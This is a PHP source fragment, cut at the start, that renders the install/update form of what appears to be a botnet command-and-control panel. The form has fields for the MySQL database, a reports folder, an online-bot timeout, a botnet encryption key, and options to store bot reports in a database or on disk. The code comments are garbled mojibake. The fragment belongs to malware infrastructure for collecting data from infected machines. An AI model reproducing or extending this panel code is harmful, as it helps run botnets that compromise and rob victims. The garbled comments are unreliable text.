    str_replace('{TEXT}', 'Database:', THEME_DIALOG_ITEM_TEXT).
    str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array(htmlEntitiesEx($pd_mysql_db), 'mysql_db', '64', DIALOG_INPUT_WIDTH), $is_update ? THEME_DIALOG_ITEM_INPUT_TEXT_RO : THEME_DIALOG_ITEM_INPUT_TEXT).
  THEME_DIALOG_ROW_END.
  THEME_DIALOG_GROUP_END.
THEME_DIALOG_ROW_END;
          
//P> RѕRєR ° P "SЊRЅS <Rμ RїSѓS, Fe.
if(!$is_update)
{
  $_FORMITEMS .= 
  THEME_DIALOG_ROW_BEGIN.
    str_replace('{COLUMNS_COUNT}', '2', THEME_DIALOG_GROUP_BEGIN).
    str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, 'Local folders:'), THEME_DIALOG_GROUP_TITLE).
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', 'Reports:', THEME_DIALOG_ITEM_TEXT).
        str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array(htmlEntitiesEx($pd_reports_path), 'path_reports', '255', DIALOG_INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
      THEME_DIALOG_ROW_END.
    THEME_DIALOG_GROUP_END.
  THEME_DIALOG_ROW_END;
}

//RћRїS † ReRe.
if(!$is_update)
{
  $_FORMITEMS .= 
  THEME_DIALOG_ROW_BEGIN.
    str_replace('{COLUMNS_COUNT}', '2', THEME_DIALOG_GROUP_BEGIN).
    str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, 'Options:'), THEME_DIALOG_GROUP_TITLE).
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', 'Online bot timeout:', THEME_DIALOG_ITEM_TEXT).
        str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array(htmlEntitiesEx($pd_botnet_timeout), 'botnet_timeout', '4', DIALOG_INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
      THEME_DIALOG_ROW_END.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', 'Encryption key (1-255 chars):', THEME_DIALOG_ITEM_TEXT).
        str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array(htmlEntitiesEx($pd_botnet_cryptkey), 'botnet_cryptkey', '255', DIALOG_INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
      THEME_DIALOG_ROW_END.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{COLUMNS_COUNT}', '2', THEME_DIALOG_GROUP_BEGIN).
          THEME_DIALOG_ROW_BEGIN.
            str_replace(array('{COLUMNS_COUNT}', '{VALUE}', '{NAME}', '{JS_EVENTS}', '{TEXT}'), array(1, 1, 'reports_to_db', '', 'Enable write reports to database.'), $pd_reports_to_db ? THEME_DIALOG_ITEM_INPUT_CHECKBOX_ON_2 : THEME_DIALOG_ITEM_INPUT_CHECKBOX_2).
          THEME_DIALOG_ROW_END.
          THEME_DIALOG_ROW_BEGIN.
            str_replace(array('{COLUMNS_COUNT}', '{VALUE}', '{NAME}', '{JS_EVENTS}', '{TEXT}'), array(1, 1, 'reports_to_fs', '', 'Enable write reports to local path.'), $pd_reports_to_fs ? THEME_DIALOG_ITEM_INPUT_CHECKBOX_ON_2 : THEME_DIALOG_ITEM_INPUT_CHECKBOX_2).
          THEME_DIALOG_ROW_END.
        THEME_DIALOG_GROUP_END.
      THEME_DIALOG_ROW_END.
    THEME_DIALOG_GROUP_END.
  THEME_DIALOG_ROW_END;
}

//P ¤ RѕSЂRјR °.
$_OUTPUT .= 
str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('idata', basename($_SERVER['PHP_SELF']), ''), THEME_FORMPOST_BEGIN).
str_replace('{WIDTH}', DIALOG_WIDTH, THEME_DIALOG_BEGIN).
  str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, APP_TITLE), THEME_DIALOG_TITLE).
  THEME_DIALOG_ROW_BEGIN.
    str_replace('{COLUMNS_COUNT}', '2', THEME_DIALOG_GROUP_BEGIN).
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', $help, THEME_DIALOG_ITEM_WRAPTEXT).
      THEME_DIALOG_ROW_END.
    THEME_DIALOG_GROUP_END.
  THEME_DIALOG_ROW_END.
  $_FORMITEMS.
  str_replace('{COLUMNS_COUNT}', 2, THEME_DIALOG_ACTIONLIST_BEGIN).
   str_replace(array('{TEXT}', '{JS_EVENTS}'), array(($is_update ? '-- Update --' : '-- Install --'), ''), THEME_DIALOG_ITEM_ACTION_SUBMIT).
  THEME_DIALOG_ACTIONLIST_END.
THEME_DIALOG_END.
THEME_FORMPOST_END;

//R'S <RІRѕRґ.
themeSmall(APP_TITLE, $_OUTPUT, 0, 0, 0);
?>